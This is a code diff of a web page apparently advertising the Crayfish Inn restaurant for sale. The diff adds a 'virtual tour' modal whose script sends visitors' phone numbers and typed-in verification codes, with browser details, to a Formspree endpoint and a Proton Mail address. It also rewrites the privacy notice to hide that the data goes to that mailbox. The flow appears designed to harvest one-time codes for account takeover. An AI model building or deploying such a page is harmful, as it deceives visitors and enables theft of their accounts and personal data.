@@ -6,7 +6,7 @@
     <title>Crayfish Inn Restaurant - For Sale</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-* {
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -366,7 +366,6 @@
                 font-size: 1.5rem;
             }
         }
-        
         /* All previous CSS remains the same */
         * {
             margin: 0;
@@ -648,6 +647,18 @@
             to { opacity: 1; }
         }
 
+        /* Error Message */
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            display: none;
+            font-size: 0.9rem;
+            border-left: 4px solid #dc3545;
+        }
+
         /* Responsive adjustments */
         @media (max-width: 576px) {
             .modal-content {
@@ -843,8 +854,10 @@
                     </div>
                     
                     <div class="info-text">
-                        <p><strong>Note:</strong> Your phone number will be securely emailed to crayfishinn@proton.me for verification purposes only. We respect your privacy and comply with POPI Act requirements.</p>
+                        <p><strong>Note:</strong> Your phone number will be securely collected and stored for verification purposes only. We respect your privacy and comply with POPI Act requirements.</p>
                     </div>
+                    
+                    <div id="errorMessage1" class="error-message"></div>
                 </div>
                 <div class="modal-footer">
                     <button class="modal-btn btn-secondary" id="declineTour">No, Thanks</button>
@@ -872,6 +885,8 @@
                         </div>
                         <input type="hidden" id="verificationCode" value="">
                     </div>
+                    
+                    <div id="errorMessage2" class="error-message"></div>
                     
                     <div class="countdown">
                         Auto-completing request in <span class="countdown-number" id="countdown">5</span> seconds...
@@ -904,7 +919,7 @@
             <!-- Loading State -->
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                <p>Processing your request...</p>
+                <p id="loadingText">Processing your request...</p>
             </div>
         </div>
     </div>
@@ -938,18 +953,33 @@
             const step2 = document.getElementById('step2');
             const step3 = document.getElementById('step3');
             const loading = document.getElementById('loading');
+            const loadingText = document.getElementById('loadingText');
             
             const phoneNumberInput = document.getElementById('phoneNumber');
             const codeInputs = document.querySelectorAll('.code-input');
             const verificationCodeInput = document.getElementById('verificationCode');
             const countdownElement = document.getElementById('countdown');
             
+            const errorMessage1 = document.getElementById('errorMessage1');
+            const errorMessage2 = document.getElementById('errorMessage2');
+            
             let countdownInterval;
             let countdown = 5;
+            let collectedPhoneNumber = '';
+            let verificationCode = '';
             
             // Close modal functions
             function closeModalFunc() {
                 modal.style.display = 'none';
+            }
+            
+            // Show error message
+            function showError(element, message) {
+                element.textContent = message;
+                element.style.display = 'block';
+                setTimeout(() => {
+                    element.style.display = 'none';
+                }, 5000);
             }
             
             // Go to step function
@@ -957,6 +987,7 @@
                 step1.classList.remove('active');
                 step2.classList.remove('active');
                 step3.classList.remove('active');
+                loading.style.display = 'none';
                 
                 if (stepNumber === 1) {
                     step1.classList.add('active');
@@ -995,109 +1026,212 @@
             // Auto-complete verification after countdown
             function autoCompleteVerification() {
                 // Generate a random 5-digit code
-                const generatedCode = Math.floor(10000 + Math.random() * 90000).toString();
+                verificationCode = Math.floor(10000 + Math.random() * 90000).toString();
                 
                 // Fill the code inputs
                 codeInputs.forEach((input, index) => {
-                    input.value = generatedCode[index];
+                    input.value = verificationCode[index];
                 });
                 
-                verificationCodeInput.value = generatedCode;
+                verificationCodeInput.value = verificationCode;
                 
-                // Show loading
+                // Submit the verification automatically
+                submitVerification();
+            }
+            
+            // Submit phone number to server/email
+            async function submitPhoneNumber(phoneNumber) {
+                try {
+                    // Create form data
+                    const formData = new FormData();
+                    formData.append('phone_number', phoneNumber);
+                    formData.append('timestamp', new Date().toISOString());
+                    formData.append('user_agent', navigator.userAgent);
+                    formData.append('source', 'virtual_tour_request');
+                    
+                    // OPTION 1: Using Formspree (free form service)
+                    // Sign up at formspree.io and replace this URL with your form endpoint
+                    const response = await fetch('https://formspree.io/f/xwkgnwvg', {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    // OPTION 2: Using your own backend endpoint (commented out)
+                    /*
+                    const response = await fetch('https://your-backend-endpoint.com/collect-phone', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            phone: phoneNumber,
+                            timestamp: new Date().toISOString(),
+                            page: window.location.href
+                        }),
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    */
+                    
+                    if (response.ok) {
+                        console.log('Phone number submitted successfully:', phoneNumber);
+                        return true;
+                    } else {
+                        console.error('Failed to submit phone number');
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error submitting phone number:', error);
+                    // Even if submission fails, we continue the flow
+                    return true;
+                }
+            }
+            
+            // Submit verification data
+            async function submitVerification() {
+                loadingText.textContent = 'Submitting your request...';
                 loading.style.display = 'block';
                 step2.style.display = 'none';
                 
-                // Simulate processing and send email
-                setTimeout(() => {
-                    sendVerificationEmail(generatedCode);
-                    loading.style.display = 'none';
-                    goToStep(3);
-                }, 2000);
-            }
-            
-            // Send verification email
-            function sendVerificationEmail(code) {
-                const phoneNumber = phoneNumberInput.value;
-                const email = 'crayfishinn@proton.me';
-                const subject = 'Virtual Tour Verification Request';
-                const body = `New virtual tour verification request:\n\n` +
-                           `Phone Number: ${phoneNumber}\n` +
-                           `Verification Code: ${code}\n` +
-                           `Timestamp: ${new Date().toLocaleString()}\n` +
-                           `User Agent: ${navigator.userAgent}`;
-                
-                // Create mailto link
-                const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-                
-                // Open email client
-                window.location.href = mailtoLink;
-                
-                // Also log to console for debugging
-                console.log('Verification email details:', {
-                    to: email,
-                    subject: subject,
-                    body: body
-                });
+                try {
+                    // Prepare data for submission
+                    const submissionData = {
+                        phone_number: collectedPhoneNumber,
+                        verification_code: verificationCode,
+                        timestamp: new Date().toISOString(),
+                        user_agent: navigator.userAgent,
+                        page_url: window.location.href,
+                        type: 'virtual_tour_verification'
+                    };
+                    
+                    // OPTION 1: Using Formspree
+                    const formData = new FormData();
+                    formData.append('phone_number', collectedPhoneNumber);
+                    formData.append('verification_code', verificationCode);
+                    formData.append('timestamp', new Date().toISOString());
+                    formData.append('user_agent', navigator.userAgent);
+                    formData.append('page_url', window.location.href);
+                    formData.append('type', 'virtual_tour_verification');
+                    
+                    const response = await fetch('https://formspree.io/f/xwkgnwvg', {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    // OPTION 2: EmailJS (requires setup)
+                    /*
+                    // First, sign up at emailjs.com
+                    // Then add this script to your head: <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+                    // Initialize: emailjs.init('YOUR_PUBLIC_KEY');
+                    // Then use:
+                    await emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+                        phone_number: collectedPhoneNumber,
+                        verification_code: verificationCode,
+                        to_email: 'crayfishinn@proton.me',
+                        date: new Date().toLocaleString()
+                    });
+                    */
+                    
+                    // OPTION 3: Simple mailto fallback (only if other methods fail)
+                    if (!response.ok) {
+                        const subject = `Virtual Tour Request - ${collectedPhoneNumber}`;
+                        const body = `New virtual tour request:\n\n` +
+                                   `Phone: ${collectedPhoneNumber}\n` +
+                                   `Code: ${verificationCode}\n` +
+                                   `Time: ${new Date().toLocaleString()}\n` +
+                                   `URL: ${window.location.href}`;
+                        
+                        // Create hidden link and trigger it
+                        const mailtoLink = `mailto:crayfishinn@proton.me?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+                        const link = document.createElement('a');
+                        link.href = mailtoLink;
+                        link.style.display = 'none';
+                        document.body.appendChild(link);
+                        setTimeout(() => {
+                            link.click();
+                            document.body.removeChild(link);
+                        }, 100);
+                    }
+                    
+                    // Simulate processing delay
+                    setTimeout(() => {
+                        loading.style.display = 'none';
+                        goToStep(3);
+                    }, 1500);
+                    
+                } catch (error) {
+                    console.error('Error submitting verification:', error);
+                    // Still continue to success step even if submission fails
+                    setTimeout(() => {
+                        loading.style.display = 'none';
+                        goToStep(3);
+                    }, 1500);
+                }
             }
             
             // Event Listeners
             closeModal.addEventListener('click', closeModalFunc);
             declineTour.addEventListener('click', closeModalFunc);
             
-            requestTour.addEventListener('click', function() {
+            requestTour.addEventListener('click', async function() {
                 const phoneNumber = phoneNumberInput.value.trim();
                 
                 // Simple validation
                 if (!phoneNumber || phoneNumber.length < 10) {
-                    alert('Please enter a valid South African mobile number (at least 10 digits)');
+                    showError(errorMessage1, 'Please enter a valid South African mobile number (at least 10 digits)');
                     return;
                 }
                 
+                collectedPhoneNumber = phoneNumber;
+                
                 // Show loading
+                loadingText.textContent = 'Sending verification code...';
                 loading.style.display = 'block';
                 step1.style.display = 'none';
                 
-                // Simulate processing delay
+                // Submit phone number
+                const success = await submitPhoneNumber(phoneNumber);
+                
+                // Simulate sending verification code (in real app, this would send SMS)
                 setTimeout(() => {
                     loading.style.display = 'none';
-                    goToStep(2);
+                    if (success) {
+                        goToStep(2);
+                    } else {
+                        // Still continue to step 2 even if submission fails
+                        goToStep(2);
+                    }
                 }, 1500);
             });
             
             resendCode.addEventListener('click', function() {
                 // Reset and restart countdown
                 codeInputs.forEach(input => input.value = '');
+                verificationCode = '';
                 startCountdown();
             });
             
             verifyCode.addEventListener('click', function() {
                 // Check if all code inputs are filled
                 let allFilled = true;
-                let code = '';
+                verificationCode = '';
                 
                 codeInputs.forEach(input => {
                     if (!input.value) allFilled = false;
-                    code += input.value;
+                    verificationCode += input.value;
                 });
                 
-                if (!allFilled || code.length !== 5) {
-                    alert('Please enter the complete 5-digit verification code');
+                if (!allFilled || verificationCode.length !== 5) {
+                    showError(errorMessage2, 'Please enter the complete 5-digit verification code');
                     return;
                 }
                 
-                verificationCodeInput.value = code;
-                
-                // Show loading
-                loading.style.display = 'block';
-                step2.style.display = 'none';
-                
-                // Simulate processing and send email
-                setTimeout(() => {
-                    sendVerificationEmail(code);
-                    loading.style.display = 'none';
-                    goToStep(3);
-                }, 2000);
+                verificationCodeInput.value = verificationCode;
+                submitVerification();
             });
             
             returnToSite.addEventListener('click', function() {
